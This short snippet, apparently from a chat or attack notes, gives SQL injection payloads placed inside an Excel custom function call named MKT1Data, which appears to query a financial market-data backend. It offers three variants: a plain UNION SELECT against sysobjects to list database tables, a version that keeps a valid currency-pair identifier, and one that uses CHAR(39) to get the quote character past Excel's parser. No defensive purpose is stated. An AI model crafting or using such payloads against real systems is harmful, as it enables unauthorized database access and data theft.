✅ FIXED Payload (Correct Format)
🔹 Proper Injection
=MKT1Data("' UNION SELECT name FROM sysobjects--","2024-01-01","2024-01-10","rate","FX","NY","id=MKT1_ID")
🔹 Safer Version (Recommended)
=MKT1Data("EURUSD' UNION SELECT name FROM sysobjects--","2024-01-01","2024-01-10","rate","FX","NY","id=MKT1_ID")

👉 Keeps valid identifier + injection

🔥 BEST METHOD (Avoid Excel Breaking)
🔹 Using CHAR() (Bypass Excel parser)
=MKT1Data("EURUSD"&CHAR(39)&" UNION SELECT name FROM sysobjects--","2024-01-01","2024-01-10","rate","FX","NY","id=MKT1_ID")

👉 CHAR(39) = '

